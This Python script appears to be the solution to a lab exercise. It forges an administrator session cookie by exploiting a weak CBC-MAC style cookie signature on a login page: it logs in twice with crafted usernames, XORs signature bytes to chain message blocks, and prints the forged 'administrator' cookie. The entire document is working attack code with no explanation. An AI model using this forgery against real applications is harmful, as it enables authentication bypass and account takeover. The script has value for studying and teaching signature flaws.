import base64
import requests


def login(username):
    res = requests.post(
        "http://ptl-a9fcbad8-1c2051fa.libcurl.so/login.php",
        data={"username": username, "password": "Password1"},
        allow_redirects=False,
    )
    print(res.request.body)
    if res.status_code == 302:
        print("[+] Logged in with username :: {}".format(username))
        return res.headers.get("set-cookie").split("=")[1]
    else:
        print("[-] Login failed with username :: {}".format(username))


def xor(data1, data2) -> bytes:
    return bytes([a ^ b for a, b in zip(data1, data2)])


cookie1 = login("administ")
signature1 = base64.b64decode(cookie1)[-8:]
expected_msg2 = bytes("rator\x00\x00\x00", "utf-8")

username2 = xor(expected_msg2, signature1)
cookie2 = login(username2).replace("%2B", "+")
signature2 = base64.b64decode(cookie2)[-8:]

final = b"administrator" + b"--" + signature2

print("Cookie1 ::", cookie1)
print("Signature1 ::", signature1)
print("Username2 ::", username2)
print("Cookie2 ::", cookie2)
print(base64.b64encode(final))
